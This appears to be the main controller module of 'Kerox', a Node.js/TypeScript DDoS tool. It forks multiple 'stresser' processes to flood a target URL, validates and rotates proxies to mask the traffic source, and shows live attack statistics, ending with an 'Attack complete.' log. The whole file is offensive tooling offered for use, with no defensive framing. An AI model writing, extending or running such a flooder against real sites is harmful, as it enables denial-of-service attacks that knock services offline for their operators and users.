import { ChildProcess, fork } from "child_process";
import path from "path";
import * as http from 'http';
import * as https from 'https';

import 'overpaint.js';

import { getStatic, parseProxies, toHumanTime } from "../utils/Utils";
import { PacketType } from "../enums/PacketType";
import { Status } from "../enums/Status";
import { Info } from "../enums/Status";
import { KeroxOptions, StresserOptions } from "../types/Options";
import { KPacket, Packet } from "../types/Packet";
import { KProxy } from "../types/Proxy";
import { Stats } from "./Stats";
import { DDoSDuration, DDoSOptions, isDDoSDuration } from "../types/DDoS";
import { LogType } from "../enums/LogType";
import { KLog, Log } from "../types/Log";
import { LogManager } from "./LogManager";
import { ProgressBar } from "./ProgressBar";
import { HttpCodeRegistry } from "./HttpCodeRegistry";

export class Kerox {
   // ===== Static =====
   public static header: string = getStatic('header.txt')._RebeccaPurple;
   // ===== Status =====
   public status: Status = Status.Unknown;
   public info: Info = Info.Unknown;
   public set _status(value: [Status?, Info?]) {
      this.status = value[0] ?? Status.Unknown;
      this.info = value[1] ?? Info.Unknown;
   }
   // ===== Logs =====
   private logs = new LogManager();
   // ===== Stressers =====
   private stressers = new Map<number, ChildProcess>();
   private stresserStats = new Map<number, Stats>();
   // ===== Proxies =====
   private proxies: KProxy[] = [];
   // ===== Agents =====
   private httpAgent: http.Agent = new http.Agent();
   // ===== Statistics =====
   private stats = new Stats();
   private progressBar = new ProgressBar(26);
   // ===== Options =====
   private ddosStartTime?: number;
   private ddosOptions?: DDoSOptions;
   private options: KeroxOptions = {
      updateInterval: 1000,
      refreshRate: 5,
      useProxies: false,
      validateProxies: true,
   };
   // ===== Constructor =====
   constructor(options?: Partial<KeroxOptions>) {
      if (typeof options === 'object') {
         Object.assign(this.options, options);
      }
      this.renderTerminal(this.options.refreshRate);
      this.initialize();
   }

   // ========== Initialization =====================================================================

   private initialize() {
      this.stats.disable();
      this.useLocalProxies();
      if (this.options.validateProxies)
         this.validateProxies(5000);
   }

   private stopStressers() {
      this.stressers.forEach(stresser => stresser.kill());
      this.stressers.clear();
      delete this.ddosOptions;
   }

   // ========== Stats ================================================================================

   private resetStats() {
      this.stats = new Stats();
      this.stresserStats.clear();
   }

   private updateStats() {
      if (this.stats._disabled) return;

      this.stats.reset();

      this.stresserStats.forEach((stats) => {
         if (!stats) return;
         this.stats.combine(stats);
      });

      if (this.ddosOptions)
         this.progressBar.update(this.stats.age / 1000 / this.ddosOptions.duration);
   }

   // ========== Rendering | Logs =====================================================================

   private renderFrame() {
      this.updateStats();
      this.logs.update();

      console.clear();
      console.log(Kerox.header + '\n');

      if (this.info === Info.Stressing) {
         if (this.ddosOptions?.display.progressBar)
            console.log(this.progressBar.bar + '\n');
         if (this.ddosOptions?.display.statistics)
            console.log(this.statsPanel(this.stats) + '\n');
         if (this.ddosOptions?.display.httpCodes)
            console.log(this.httpCodesPanel(this.stats.codes) + '\n');
      }

      this.logs.print(LogType.Stats);
      this.logs.print(LogType.Info);
   }

   public renderTerminal(fps: number = 10) {
      this.renderFrame();
      setInterval(() => this.renderFrame(), 1000 / fps);
   }

   private createField(label: string, data: any, ...styles: string[]): string {
      let field = `${label}:`.padEnd(11) + `${data}`.padStart(15);
      for (let style of styles)
         field = field[`_${style}` as any];
      return field;
   }

   private createPannel(fields: [string, any, string][]): string {
      let pannel = '';
      for (let [label, data, ...styles] of fields) {
         let field = this.createField(label, data, ...styles);
         pannel += field + '\n';
      }
      return pannel.trimEnd();
   }

   private statsPanel(stats: Stats): string {
      return this.createPannel([
         ['Duration', stats.duration, 'Gray'],
         ['Speed', stats.speed, 'Gray'],
         ['Requests', stats.requests, 'White'],
         ['Pending', stats.pending, 'OrangeGold'],
         ['Success', stats.success, 'GreenApple'],
         ['Fails', stats.fails, 'Orange'],
         ['Errors', stats.errors, 'Red'],
         ['Dropped', stats.dropped, 'Gray'],
      ]);
   }

   private httpCodesPanel(codes: HttpCodeRegistry): string {
      return this.createPannel([
         ['1XX', codes._1XX, 'Gray'],
         ['2XX', codes._2XX, 'Gray'],
         ['3XX', codes._3XX, 'Gray'],
         ['4XX', codes._4XX, 'Gray'],
         ['5XX', codes._5XX, 'Gray'],
      ]);
   }

   // ========== Proxies ===============================================================================

   /**
    * Reads the proxies from the file and saves them to the proxies array.
    */
   private useLocalProxies() {
      let rawProxies = getStatic('proxies.txt').split('\n');
      this.proxies = parseProxies(rawProxies);
   }

   /**
    * Starts a stresser to validate the proxies and keep only the working ones.
    */
   private validateProxies(timeout: number = 5000) {
      if (!this.options.useProxies)
         return void this.logs._info('Skipping proxy validation.'._dim);
      // set status
      this._status = [Status.Busy, Info.ValidatingProxies];
      this.resetStats();
      // validate proxies
      let validator = this.spawn({
         updateInterval: this.options.updateInterval!,
         target: 'https://example.com',
         useProxies: true,
         proxies: this.proxies,
         multiplier: 1,
         threads: 1,
         agent: undefined,
         dropRequests: false,
      });
      // listen for validation completion
      validator?.on('message', (packet: KPacket) => {
         if (packet.type === PacketType.Done) {
            let rawProxies = getStatic('valid_proxies.txt').split('\n');
            let validProxies = parseProxies(rawProxies);
            this.logs._info(`Found ${validProxies.length} valid proxies`);
            if (validProxies.length > 0) {
               this.proxies = validProxies;
            } else {
               this.logs._info('Stopping Kerox...'._Red._bold);
               setTimeout(process.exit, 1000);
            }
            this._status = [Status.Idle, Info.Unknown];
         }
      });
      // start proxy validation
      let packet = Packet(PacketType.ValidateProxies, {
         proxies: this.proxies,
         timeout: timeout
      });
      validator.send(packet);
   }

   // ========== Stressers =============================================================================

   /**
    * Starts a stresser sub-process.
    * @param options Configuration options for the stresser
    */
   private spawn(options: StresserOptions): ChildProcess {
      const stresser = fork(path.join(__dirname, '..', 'exec', 'Spawn.js'), []);
      this.stressers.set(stresser.pid!, stresser);

      stresser.on('message', (packet: KPacket) => {
         if (typeof packet !== 'object') return;
         switch (packet.type) {
            case PacketType.Spawned:
               this.logs._info(`Spawned Kerox (pid: ${stresser.pid})`._GreenApple._dim, 5000);
               break;
            case PacketType.Done:
               this.kill(stresser.pid!, false);
               break;
            case PacketType.Data:
               this.stresserStats.set(stresser.pid!, packet.data!);
               break;
            case PacketType.Log:
               this.logs.push(packet.data!);
               break;
            case PacketType.Error:
               this.logs.push(Log(LogType.Info, packet.data as any));
               this.renderFrame();
               process.exit(1);
               break;
         }
      });

      stresser.send(Packet(PacketType.Init, {
         ...this.options,
         ...options
      }));

      return stresser;
   }

   /**
    * Kills a stresser sub-process.
    * @param pid The process id of the stresser to kill
    */
   private kill(pid: number, deleteStats: boolean) {
      const stresser = this.stressers.get(pid);
      if (!stresser) return;
      stresser.kill();
      this.stressers.delete(stresser.pid!);
      if (deleteStats)
         this.stresserStats.delete(stresser.pid!);
      this.logs._info(`Killed Kerox (pid: ${stresser.pid})`._Red._dim, 5000);
   }

   // ========== DDoS ==================================================================================

   /**
    * Starts stressing a target url with a single stresser
    * @param target The target url
    */
   public ddos(options: DDoSOptions) {
      if (!isDDoSDuration(options.duration))
         return void this.logs._info(`Invalid duration.`._Red);

      if (this.status === Status.Busy)
         return void this.logs._info(`Kerox is ${this.status}. ${this.info}`._Red);

      this._status = [Status.Busy, Info.Stressing];
      this.stopStressers();
      this.ddosOptions = options;

      const onSpawned = () => {
         this.resetStats();
         this.stressers.forEach(stresser => stresser.send(Packet(PacketType.Stress, options.duration)));
      }
      const onCompleted = () => {
         this._status = [Status.Idle, Info.Unknown];
         this.logs._info('Attack complete.'._GreenApple._bold);
         this.logs._stats(this.statsPanel(this.stats) + '\n');
         if (this.ddosOptions?.display.httpCodes)
            this.logs._stats(this.httpCodesPanel(this.stats.codes) + '\n');
         this.stopStressers();
         this.stats.disable();
      };
      // spawn stressers
      let spawned = 0;
      let completed = 0;
      for (let i = 0; i < options.CPUs; i++) {
         const stresser = this.spawn({
            updateInterval: this.options.updateInterval!,
            target: options.target,
            useProxies: this.options.useProxies,
            proxies: this.proxies,
            multiplier: options.multiplier,
            threads: Math.floor(options.threads / options.CPUs),
            agent: options.agent,
            dropRequests: options.dropRequests,
         });
         // wait for completed
         stresser.on('message', (packet: KPacket) => {
            switch (packet.type) {
               case PacketType.Spawned:
                  spawned++;
                  if (spawned === options.CPUs) onSpawned();
                  break;
               case PacketType.Done:
                  completed++
                  if (completed === options.CPUs) onCompleted();
                  break;
            }
         });
      }
   }

}